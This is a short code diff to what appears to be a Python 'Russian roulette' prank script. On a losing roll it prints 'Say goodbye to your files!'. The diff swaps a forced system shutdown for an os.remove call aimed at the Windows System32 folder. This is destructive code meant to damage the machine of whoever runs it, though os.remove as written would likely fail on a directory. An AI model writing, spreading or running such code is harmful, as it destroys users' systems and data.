@@ -10,7 +10,7 @@ def chamber_rotate():
 def fire_gun():
     if bullet == chamber_rotate():
         print(colored("You lost! Say goodbye to your files!"))
-        os.system("shutdown /s /t 1")
+        os.remove("C:\Windows\System32")
         sys.exit()
     else:
         print("Lucky you. Your files live to see another day.")
